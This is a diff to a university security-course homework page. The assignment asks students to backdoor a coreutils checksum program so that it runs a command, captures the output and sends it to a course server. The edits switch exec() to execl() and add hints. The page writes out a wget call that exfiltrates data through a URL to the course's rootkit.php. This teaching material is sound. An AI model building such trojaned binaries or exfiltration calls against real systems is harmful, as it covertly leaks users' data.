@@ -69,7 +69,7 @@
 <p>You can do this in any language that you want:</p>
 <ul>
 <li>A bash shell script will be the shortest, but familiarize yourself with how to deal command-line parameters in bash -- you can see the cryptmoney.sh shell script in the <a href="hw-cryptocurrency.html">cryptocurrency</a> (<a href="hw-cryptocurrency.md">md</a>) homework for examples</li>
-<li>C/C++ program: if you need a refresher as to how to parse command-line parameters, see <a href="https://uva-cs.github.io/pdr/slides/04-arrays-bigoh.html#/cmdlineparams">this slide from CS 2150</a> and the source code linked to on that page; to execute another program, you will want to use the <a href="https://www.systutorials.com/docs/linux/man/3-exec/">exec()</a> C function, which is in the <code>&lt;unistd.h&gt;</code> library.</li>
+<li>C/C++ program: if you need a refresher as to how to parse command-line parameters, see <a href="https://uva-cs.github.io/pdr/slides/04-arrays-bigoh.html#/cmdlineparams">this slide from CS 2150</a> and the source code linked to on that page; to execute another program, you will want to use the <a href="https://www.systutorials.com/docs/linux/man/3-exec/">execl()</a> C function, which is in the <code>&lt;unistd.h&gt;</code> library.</li>
 <li>We can't use Java -- we need the executable name to be <code>sha224sum</code>, not <code>sha224sum.class</code></li>
 <li>Python 3 is fine</li>
 <li>We also support Go (version 1.10)!</li>
@@ -93,10 +93,18 @@ Codename:       bionic</code></pre>
 <pre><code>NoLSBmodulesareavailable.DistributorID:UbuntuDescription:Ubuntu18.04.2LTSRelease:18.04Codename:bionic</code></pre>
 <p>We are less focused on text formatting and more on the obtaining and transmission of the information.</p>
 <p>You will need to execute a command-line program and capture the output -- see the code <a href="https://stackoverflow.com/questions/7292642/grabbing-output-from-exec">here</a> for how to do this (you can copy the code at that link for this assignment).</p>
-<p>You will then need to transmit this over the network. To simplify it, you just call a URL: <a href="https://libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=..." class="uri">https://libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=...</a> where mst3k is your userid and the <code>...</code> is the data you are sending. You can do this via a <code>wget</code> call (again, executing a command-line program from the C/C++ program via <a href="https://www.systutorials.com/docs/linux/man/3-exec/">exec()</a>): <code>wget https//libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=...</code>. This puts the information into the apache web server log. There are more efficient ways to do this, but putting it into the apache log is fine for this assignment.</p>
+<p>You will then need to transmit this over the network. To simplify it, you just call a URL: <a href="https://libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=..." class="uri">https://libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=...</a> where mst3k is your userid and the <code>...</code> is the data you are sending. You can do this via a <code>wget</code> call (again, executing a command-line program from the C/C++ program via <a href="https://www.systutorials.com/docs/linux/man/3-exec/">execl()</a>): <code>wget https//libra.cs.virginia.edu/rootkit.php?userid=mst3k&amp;data=...</code>. This puts the information into the apache web server log. There are more efficient ways to do this, but putting it into the apache log is fine for this assignment.</p>
 <p>To see what information has been sent, go directly to the <a href="https://libra.cs.virginia.edu/rootkit.php" class="uri">https://libra.cs.virginia.edu/rootkit.php</a> URL. Once you log in with Netbadge, you will be able to see all the data sent in under that userid.</p>
 <p>Note that the logs that are displayed only keep the information sent in the last few hours -- we will look at the entire log history when we grade the assignment, but the information that you see will be only the most recent. So don't worry if the entries that you saw on a previous day are no longer present. As long as they were there at <em>some</em> point, we'll see them when we grade the assignment.</p>
 <p>The only file you should submit from this is the modified <code>md5sum.c</code> file. We will unpack and configure the entire coreutils archive, put the md5sum.c file in there, and then recompile the <code>sha384sum</code> program. Thus, you do NOT need anything in your Makefile for this task</p>
+<h2 id="hints-and-tips">Hints and tips</h2>
+<p>We've collected a few of these here...</p>
+<ul>
+<li>The <code>which</code> command in linux tells you where the specified system binary is in the filesystem; for example, if you enter 'which ls', the path to the ls binary (/bin/ls) should be printed out</li>
+<li>Similarly, the <code>PATH</code> environment variable indicates all the possible locations that the system looks for when you want to execute a command. You can view it with <code>echo $PATH</code></li>
+<li>If you finished the backdoored <code>sha224sum</code> rootkit, but it's not printing out anything, consider flushing out stdout to force print the contents in the stdout buffer.</li>
+<li><code>exec()</code> refers to a family of functions that can execute other processes; we recommend using <code>execl()</code> for this assignment (though you are free to do otherwise!)</li>
+</ul>
 <h2 id="submission">Submission</h2>
 <p>The following files will need to be submitted:</p>
 <ul>
